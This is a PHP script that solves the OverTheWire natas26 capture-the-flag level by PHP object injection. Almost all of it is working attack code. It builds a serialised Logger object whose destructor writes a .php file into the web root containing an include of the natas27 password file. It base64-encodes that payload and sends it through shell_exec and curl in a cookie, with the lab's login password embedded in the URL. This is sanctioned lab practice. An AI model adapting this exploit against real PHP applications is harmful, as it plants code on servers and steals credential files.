<?php

// https://blog.ripstech.com/2018/php-object-injection/

class Logger{
  private $logFile;
  private $initMsg;
  private $exitMsg;

  function __construct($file){
      // initialise variables
      $this->initMsg="#--session started--#\n";
      $this->exitMsg="#--session end--#\n";
      $this->logFile = "/tmp/natas26_" . $file . ".log";

      // write initial message
      $fd=fopen($this->logFile,"a+");
      fwrite($fd,$initMsg);
      fclose($fd);
  }

  function log($msg){
      $fd=fopen($this->logFile,"a+");
      fwrite($fd,$msg."\n");
      fclose($fd);
  }

  function __destruct(){
      // write exit message
      $fd=fopen($this->logFile,"a+");
      fwrite($fd,$this->exitMsg);
      fclose($fd);
  }
}

$logger = new Logger("foo");
$original = serialize($logger);

$original_file = fopen("original.txt", "w") or die("Unable to open file!");
fwrite($original_file, $original);
fclose($original_file);

$new = "O:6:\"Logger\":3:{s:15:\"\0Logger\0logFile\";s:20:\"/tmp/natas26_foo.log\";s:15:\"\0Logger\0initMsg\";s:22:\"#--session started--#\n\";s:15:\"\0Logger\0exitMsg\";s:18:\"#--session end--#\n\";}";
$new_file = fopen("new.txt", "w") or die("Unable to open file!");
fwrite($new_file, $new);
fclose($new_file);

$injection = "O:6:\"Logger\":3:{s:15:\"\0Logger\0logFile\";s:35:\"/var/www/natas/natas26/img/evil.php\";s:15:\"\0Logger\0initMsg\";s:1:\"#\";s:15:\"\0Logger\0exitMsg\";s:42:\"<?include('/etc/natas_webpass/natas27');?>\";}";

$logger = unserialize($injection);
print_r($logger);

$base64 = base64_encode($injection);
print($base64 . "\n");

shell_exec("curl -s 'http://natas26:oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T@natas26.natas.labs.overthewire.org/index.php' -H 'Cookie: drawing=" . $base64 . "'")

?>
